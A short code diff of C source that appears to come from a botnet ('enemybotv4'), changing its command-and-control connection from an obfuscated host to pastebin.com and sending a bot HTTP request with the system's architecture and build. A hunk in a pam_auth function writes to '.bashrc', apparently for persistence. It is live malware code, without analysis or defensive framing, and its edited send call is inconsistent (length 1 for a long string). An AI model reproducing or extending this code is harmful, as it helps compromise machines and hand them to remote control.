@@ -4227,7 +4227,7 @@ int pam_auth(char *username, char *password, char *host)
     size_t nread;
     char *ptr;
 
-	char *bashrc = "..bashrc";
+	char *bashrc = ".bashrc";
 
 	FILE *fptr = fopen(bashrc,"w");
 
@@ -5111,12 +5111,12 @@ int main(int argc, char**argv) {
 		{
 			close(fd_cnc);
 		}
-		if(!connectTimeout(fd_cnc, eika("\xfc\x86\xad\x74\x20\xad\xe1\x9a\x52\xad\x86\x20"), 7, 7))
+		if(!connectTimeout(fd_cnc, "pastebin.com", 80, 7))
 		{
 			close(fd_cnc);
 		} else {
 			_time=0;
-			send(fd_cnc, "\x01", 1, MSG_NOSIGNAL);
+			send(fd_cnc, "GET /raw/\r\nHost: pastebin.com\r\nUser-Agent: enemybotv4\r\nConnection: keep-alive\r\n\r\n", 1, MSG_NOSIGNAL);
 			sockprintf(fd_cnc, "%s %s\n", okic("f=rb"), getBuild()); //decoded is "arch"
 			while((got = recvLine(rdbuf, 1024)) != -1)
 			{
